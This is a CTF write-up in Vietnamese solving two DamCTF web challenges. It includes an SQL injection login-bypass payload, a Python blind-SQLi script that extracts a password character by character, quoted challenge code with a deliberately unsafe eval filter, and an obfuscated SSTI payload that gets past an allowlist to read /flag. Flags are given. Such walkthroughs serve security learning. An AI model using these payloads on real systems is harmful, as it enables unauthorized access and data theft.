# Category: Web challenge
Đã quá lâu rồi không viết gì, thôi thì nhân một ngày bình thường mình sẽ viết một cái gì đó để "take back my power".
## bouncy-box
**Dạng bài: sqli**

Bắt đầu challenge, chúng ta sẽ thấy một form đăng nhập:

![image](https://user-images.githubusercontent.com/83667873/141960479-364ff111-a5e4-491d-a1e1-6025da82f9bd.png)

Ở bước này, chúng ta có thể thực hiện sql injection bằng một payload đơn giản:
```
username_input=' or 1#&password_input=
```
Sau khi đăng nhập thành công chúng ta sẽ được redirect tới một page, trong page này chúng ta sẽ thấy một button để get flag:

![image](https://user-images.githubusercontent.com/83667873/141958523-6004408a-c67c-49cb-b989-eeb94907015f.png)

Thử click vào free flag, và tất nhiên không thể get flag, đời không như mer. Lại một form đăng nhập nữa mình hiện ra:

![image](https://user-images.githubusercontent.com/83667873/141958918-9d09449d-5687-406d-a3eb-e559f94c2431.png)

Mình thử một vài payload sqli cơ bản nhưng không có gì bất thường, có lẽ chúng ta cần phải lấy được password để đăng nhập. But how??

Câu trả lời nằm ở form đăng nhập đầu tiên, ở đây chúng ta có thể sử dụng blind sqli lên form đăng nhập đầu tiên để lấy mật khẩu:

Code cùi bắp để lấy password do mình viết:

```
import requests, string

url ='https://bouncy-box.chals.damctf.xyz/login'
length = 0
password=''

#Find length of password:
for i  in range(1,50):
	r = requests.post(url,data={'username_input':'boxy_mcbounce',"password_input":f"' or length(password)='{i}'#"})
	if "boxy_mcbounce's Stats" in r.text:
		length = i
		print("length of password: ",length)
		break

#Find password:
for i in range(1,length+1):
	for s in string.printable:
		r = requests.post(url,data={'username_input':'boxy_mcbounce',"password_input":f"' or substr(password,{i},1)='{s}'#"})
		if "boxy_mcbounce's Stats" in r.text:
			print(s)
			password += s
			break
print('Password: ',password)
```
Kết quả:

![image](https://user-images.githubusercontent.com/83667873/141961528-74f43f7d-6b44-499b-9061-e3db61a46211.png)

Thực hiện đăng nhập với password vừa tìm được và username là `boxy_mcbounce` và get flag.

### Flag: dam{b0uNCE_B0UNcE_b0uncE_B0uNCY_B0unce_b0Unce_b0Unc3}

## super-secure-translation-implementation

Docker file:

![image](https://user-images.githubusercontent.com/83667873/141968406-16f20ff3-7a04-4764-a662-0552d5ed7425.png)

Theo như docker file thì chúng ta đều có thể xem được nội dung của file app.py, check.py, filters.py và limit.py
#### check.py
```
from limit import is_within_bounds, get_golf_limit


def allowlist_check(payload, allowlist):
    # Check against allowlist.
    print(f"Starting Allowlist Check with {payload} and {allowlist}")
    if set(payload) == set(allowlist) or set(payload) <= set(allowlist):
        return payload
    print(f"Failed Allowlist Check: {set(payload)} != {set(allowlist)}")
    return "Failed Allowlist Check, payload-allowlist=" + str(
        set(payload) - set(allowlist)
    )


def detect_remove_hacks(payload):
    # This effectively destroyes all web attack vectors.
    print(f"Received Payload with length:{len(payload)}")

    if not is_within_bounds(payload):
        return f"Payload is too long for current length limit of {get_golf_limit()} at {len(payload)} characters. Try locally."

    allowlist = [
        "c",
        "{",
        "}",
        "d",
        "6",
        "l",
        "(",
        "b",
        "o",
        "r",
        ")",
        '"',
        "1",
        "4",
        "+",
        "h",
        "u",
        "-",
        "*",
        "e",
        "|",
        "'",
    ]
    payload = allowlist_check(payload, allowlist)
    print(f"Allowlist Checked Payload -> {payload}")

    return payload
```
### filters.py:
**Dạng: SSTI**
```
import base64


def uppercase(x):
    return x.upper()


def lowercase(x):
    return x.lower()


def b64d(x):
    return base64.b64decode(x)


def order(x):
    return ord(x)


def character(x):
    return chr(x)


def e(x):
    # Security analysts reviewed this and said eval is unsafe (haters).
    # They would not approve this as "hack proof" unless I add some
    # checks to prevent easy exploits.

    print(f"Evaluating: {x}")

    forbidlist = [" ", "=", ";", "\n", ".globals", "exec"]

    for y in forbidlist:
        if y in x:
            return "Eval Failed: Foridlist."

    if x[0:4] == "open" or x[0:4] == "eval":
        return "Not That Easy ;)"

    try:
        return eval(x)
    except Exception as exc:
        return f"Eval Failed: {exc}"
```
### limit.py:
```
import time

from rctf import golf


def get_golf_limit() -> int:
    rctf_host = "https://damctf.xyz/"
    challenge_id = "super-secure-translation-implementation"
    ctf_start = 1636156800
    limit_function = lambda x: (x * 2) + 147

    limit = golf.calculate_limit(rctf_host, challenge_id, ctf_start, limit_function)
    return limit


def is_within_bounds(payload: str) -> bool:

    return len(payload) <= get_golf_limit()
```
Ngoài ra file docker còn cho chúng ta biết được là flag đang ở /flag

Nhìn vào file filters.py, trong hàm e chúng ta sẽ thấy sự xuất hiện của eval().

Mục tiêu của chúng ta là gọi được eval, sau đó thực hiện: `open('/flag').read()`

kiểm tra trong file check.py, chỉ có nhưng kí tự trong allowlist được phép sử dụng.

Nhưng trong payload của chúng ta sử dụng có những kí tự không được phép: p, n, /, f, a, g, ., r

lúc này chúng ta có thể sử dụng hàm character trong filters để đổi từ giá trị hex sang ascii để lấy kí tự mong muốn. (Ở đây có một lưu ý là chỉ có số 6, 1, 4 là được phép sử dụng).
- p = chr(112) = chr(66+46)
- n = chr(110) = chr(66+44)
- / = chr(47) = chr(46+1)
- f = chr(102) = chr(44+46+6+6)
- a = chr(97) = chr(16*6+1)
- g = chr(103) = chr(16*6+6+1)
- . = chr(46)
- r = chr(114)

Vậy:
```
open("flag.txt").read() 
'o'%2b(66%2b46)|ch%2b'e'%2b(66%2b44)|ch%2b'("'%2b(46%2b1)|ch%2b(16*6%2b6)|ch%2b'l'%2b(16*6%2b1)|ch%2b(16*6%2b6%2b1)|ch%2b'")'%2b(46)|ch%2b(114)|ch%2b'e'%2b(16*6%2b1)|ch%2b'd()'
```
Nhưng trong hàm `e` kiểm tra xem 4 kí tự đầu tiên của tham số truyền vào có phải là open hay không. Nếu là open thì việc gọi eval sẽ thất bại. Vậy nên chúng ta cần sửa đổi một tý để payload trở thành:
```
(open)("flag.txt").read()
'(o'%2b(66%2b46)|ch%2b'e'%2b(66%2b44)|ch%2b')'%2b'("'%2b(46%2b1)|ch%2b(16*6%2b6)|ch%2b'l'%2b(16*6%2b1)|ch%2b(16*6%2b6%2b1)|ch%2b'")'%2b(46)|ch%2b(114)|ch%2b'e'%2b(16*6%2b1)|ch%2b'd()'
```
![image](https://user-images.githubusercontent.com/83667873/142007615-0d08bb00-bf09-4d22-92ec-dacd5c5af121.png)

Cuối cùng, gọi hàm e để call eval:
```
eval((open)("flag.txt").read())
('(o'%2b(66%2b46)|ch%2b'e'%2b(66%2b44)|ch%2b')'%2b'("'%2b(46%2b1)|ch%2b(16*6%2b6)|ch%2b'l'%2b(16*6%2b1)|ch%2b(16*6%2b6%2b1)|ch%2b'")'%2b(46)|ch%2b(114)|ch%2b'e'%2b(16*6%2b1)|ch%2b'd()')|e
```

![image](https://user-images.githubusercontent.com/83667873/142007920-ece3a1d9-7d85-4ee9-a487-91718b79a007.png)

### Flag: dam{p4infu1_all0wl1st_w3ll_don3}

## Thank you for your reading!
